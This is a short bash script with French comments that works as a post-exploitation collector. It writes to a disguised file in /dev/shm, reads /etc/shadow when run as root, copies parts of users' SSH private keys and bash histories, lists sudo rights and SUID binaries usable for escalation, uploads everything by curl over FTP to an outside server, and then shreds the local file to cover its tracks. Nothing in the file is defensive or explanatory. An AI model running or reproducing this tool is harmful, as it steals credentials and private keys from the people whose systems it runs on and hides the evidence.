#!/bin/bash

OUT="/dev/shm/.syslog.tmp"
> "$OUT"

# Collecte minimale
echo "[*] $(date '+%Y-%m-%d %H:%M:%S')" >> "$OUT"
id >> "$OUT"
hostname >> "$OUT"
ip a | grep inet | grep -v '127.0.0.1' | awk '{print $2}' | head -n1 >> "$OUT"

# Si root, capture quelques lignes du fichier shadow
[ "$(id -u)" -eq 0 ] && head -n 5 /etc/shadow >> "$OUT" 2>/dev/null

# Clés SSH & historique bash (extraits légers)
find /home -name id_rsa -exec head -n 5 {} \; 2>/dev/null >> "$OUT"
find /home -name .bash_history -exec head -n 5 {} \; 2>/dev/null >> "$OUT"

# Commandes sudo autorisées
sudo -l 2>/dev/null | grep -v "may not" >> "$OUT"

# Binaries SUID
find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null | grep -E 'bash|python|perl|find|nmap' >> "$OUT"

# Exfiltration via FTP (modification demandée)
curl -s -T "$OUT" ftp://user:pass@ton-serveur.com/uploads/sysinfo.txt --ftp-create-dirs >/dev/null

# Nettoyage
shred -u "$OUT"
